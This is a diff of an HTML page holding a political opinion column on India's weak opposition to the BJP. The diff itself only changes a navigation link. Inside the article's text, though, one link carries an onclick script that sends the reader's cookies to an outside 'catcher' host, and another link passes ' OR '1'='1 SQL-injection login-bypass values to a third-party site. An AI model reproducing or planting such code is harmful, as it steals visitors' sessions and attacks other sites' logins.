@@ -19,7 +19,7 @@
 
 <p class="details">Written by Pratap Bhanu Mehta | September 15, 2016 11:34AM IST <a href="#"></a> </p>
 <h2 align="right"><a href="20160914-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160916-opinion.php"> Next </a> </h2>
 <p>
 The <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Modi government’s performance </a> and grip over political reality are debatable matters. But those worried about Indian democracy should worry about the fact that the credibility of all alternative poles of opposition is plummeting even faster. The BJP may be trapped by its inflated claims and ideological leanings. But the sheer self-destructive pettiness and parochialism of the other parties is making it likely that the BJP’s <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">failings will not be challenged </a> by a credible Opposition, but by an outbreak of infantilism, where each alternative leader seems to get smaller by the day.
 </p><p>
